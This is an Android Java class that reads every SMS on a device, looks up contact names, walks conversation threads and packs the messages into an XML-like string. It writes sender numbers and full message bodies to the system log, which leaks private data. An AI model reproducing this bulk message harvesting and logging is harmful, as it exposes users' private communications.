package smsInformations;

import java.util.ArrayList;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract.PhoneLookup;
import android.util.Log;

public class GetSMS {

private ArrayList<SMS> SmsList;	
	
	public GetSMS(){}
	
	
	public ArrayList<SMS> getSmsList() {
		return SmsList;
	}


	public void setSmsList(ArrayList<SMS> smsList) {
		SmsList = smsList;
	}


	public void getAllSms(Context context) {
		
		ArrayList<SMS> smslist= new ArrayList<SMS>();
		
	    Uri message = Uri.parse("content://sms/");
	    ContentResolver cr = context.getContentResolver();
	    Cursor c = cr.query(message, null, null, null, null);
	    int totalSMS = c.getCount();
	    if (c.moveToFirst()) {
	        for (int i = 0; i < totalSMS; i++) {

	        	SMS sms= new SMS();

   
	            sms.setContactNumber(c.getString(c
	                                    .getColumnIndexOrThrow("address")));
	            
	            sms.setMessage(c.getString(c.getColumnIndexOrThrow("body")));
	            
	            sms.setConversationID(c.getInt(c.getColumnIndexOrThrow("thread_id")));
	            
	            smslist.add(sms);
	            c.moveToNext();
	        }
	    }
	    setSmsList(smslist);
	    c.close();

	}

	public String getContactName(Context context, String phoneNumber) {
	    ContentResolver cr = context.getContentResolver();
	    Uri uri = Uri.withAppendedPath(PhoneLookup.CONTENT_FILTER_URI,
	            Uri.encode(phoneNumber));
	    Cursor cursor = cr.query(uri,
	            new String[] { PhoneLookup.DISPLAY_NAME }, null, null, null);
	    if (cursor == null) {
	        return null;
	    }
	    String contactName = null;
	    if (cursor.moveToFirst()) {
	        contactName = cursor.getString(cursor
	                .getColumnIndex(PhoneLookup.DISPLAY_NAME));
	    }
	    if (cursor != null && !cursor.isClosed()) {
	        cursor.close();
	    }
	    return contactName;
	}

	public void getConversations(Context context){
		Uri SMS_INBOX = Uri.parse("content://sms/conversations/");
	    Cursor c = context.getContentResolver().query(SMS_INBOX, null, null, null, "date desc");

        String[] count = new String[c.getCount()];
        String[] snippet = new String[c.getCount()];
        String[] thread_id = new String[c.getCount()];

        c.moveToFirst(); 
        for (int i = 0; i < c.getCount(); i++) {
            count[i] = c.getString(c.getColumnIndexOrThrow("msg_count"))
                    .toString();
            thread_id[i] = c.getString(c.getColumnIndexOrThrow("thread_id"))
                    .toString();
            snippet[i] = c.getString(c.getColumnIndexOrThrow("snippet"))
                    .toString();
            //Toast.makeText(getApplicationContext(), count[i] + " - " + thread_id[i]+" - "+snippet[i] , Toast.LENGTH_LONG).show();
            c.moveToNext();
            
            Log.d("GetSMS", count[i]+" : #"+thread_id[i]+"   "+snippet[i]);
        }
        c.close();
        Log.d("GetSMS","---------------");
        getMessages(context, thread_id);
	}
	
	
	public void getMessages(Context context, String[] thread_id){
		for(int ad = 0; ad < thread_id.length ; ad++)
	    {
		    Uri uri = Uri.parse("content://sms/inbox");
		    String where = "thread_id="+thread_id[ad]; 
		    Cursor mycursor= context.getContentResolver().query(uri, null, where ,null,null); 
		    //startManagingCursor(mycursor);
	
		    String[] number = new String[mycursor.getCount()];
		    String[] text = new String[mycursor.getCount()];
	
		    if(mycursor.moveToFirst()){
	            for(int i=0;i<mycursor.getCount();i++){
	            	// COLONNES POSSIBLES :
	            	// [ _id, thread_id, address, person, date, protocol,
	            	//   read, status, type, reply_path_present, subject, body, service_center, locked ]
                    number[i]=mycursor.getString(mycursor.getColumnIndexOrThrow("address")).toString();
                    text[i]=mycursor.getString(mycursor.getColumnIndexOrThrow("body")).toString();
                    Log.d("GetSMS", where+" : "+number[i]+"  "+text[i]);
                    mycursor.moveToNext();
	            }
		    }
		    mycursor.close();
		}
	}
	public String getAllSmsToXML(Context context){
		
		getAllSms(context);
		String res="";
		for(int i=0;i<SmsList.size();i++)
		{
			res=res+"<sms>"+/*SmsList.get(i).getContactName()+*/SmsList.get(i).getConversationID()+SmsList.get(i).getContactNumber()+SmsList.get(i).getMessage()+"</sms>";
			
		}
		return res;
	}
}
